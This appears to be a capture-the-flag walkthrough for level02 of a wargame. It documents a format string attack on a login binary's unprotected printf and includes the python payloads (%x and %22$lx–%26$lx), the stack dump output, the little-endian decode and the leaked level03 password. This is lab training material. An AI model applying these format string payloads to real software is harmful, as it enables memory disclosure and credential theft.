## WALKTHROUGH - LEVEL02

---

To have a better understanding of what happens inside the stack of the program and what we'll use for our exploit, here is a little diagram of the stack:

| Name | Address range | Purpose |
| :---: | :----: | :---: |
|  |  **RBP** |  |
|| ... ||
| Input username | RBP-**0x70** : RBP-0x10 | Stores the input given in the password section |
|  Ø | RBP-**0x78** : RBP-0x70 | Ø |
| **Level03 password** | RBP-**0xa0** : RBP-0x78 | Stores the real level03 password|
|  Ø | RBP-**0xb0** : RBP-0xa0 | Ø |
| Input password | RBP-**0x110** : RBP-0xb0 | Stores the input given in the password section|
|| ... ||
|  | **RSP** | or: RBP-0x120 |

---

As we can see, the program takes two user inputs, and stores them at the beginning and the end of the stack.

We can also see that the the first input, the **username input**, is printed by **printf** at the end in **an unprotected way**, which means we can **use a format string attack** there:

```sh
  400a96:	48 8d 45 90          	lea    rax,[rbp-0x70]
  400a9a:	48 89 c7             	mov    rdi,rax
  400a9d:	b8 00 00 00 00       	mov    eax,0x0
  400aa2:	e8 19 fc ff ff       	call   4006c0 <printf@plt>
```

We know we are in an ELF64 binary, so the **arguments** will be first **looked** for inside of registers (RDI, RSI, RDX, RCX, R8, R9), and **then on the stack**. This means that we could potentially **have access to the Level03 password zone on the stack** if we go far enough.  
So we check that by writing multiple **%x** in the username buffer, which will only print 4 bytes of memory at each address, and we fill the password buffer with "A":

```sh
level02@OverRide:~$ python -c 'print "%x "*31 + "\n" + "A"*96 + "\n"' > test
level02@OverRide:~$ cat test | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe3d0 0 41 2a2a2a2a 2a2a2a2a ffffe5c8 f7ff9a08 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 41414141 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 25207825 20782520 78252078 25207825  does not have access!
```

So we can see that we printed multiple A strings, and at the end we can notice a pattern of *"207825"* , which is, in ascii, *"%x "*, which is what we put in our username input.  
So we can deduce than **we can indeed access to the password buffer**, between the null values: `0 34376848 61733951 574e6758 6e475873 664b394d 0`.  
We only **printed the first 4 bytes of the addresses** though, so we need to write another payload to print the full addresses. 
We know that the addresses are located between the 22nd and the 26th argument, and that the **l** modifier in printf can print long values(8 bytes).

Our payload then looks like this:

```sh
level02@OverRide:~$ python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx" + "\n\n"' > payload
level02@OverRide:~$ cat payload | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!

```

We now have dumped the full password buffer, so we now need to reverse each string as they were stored in little endian on the stack, and print them in their ascii value, and we get the password:

```sh
level02@OverRide:~$ python -c 'print "\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] + "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] + "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] + "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] + "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1]'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3Ho
```
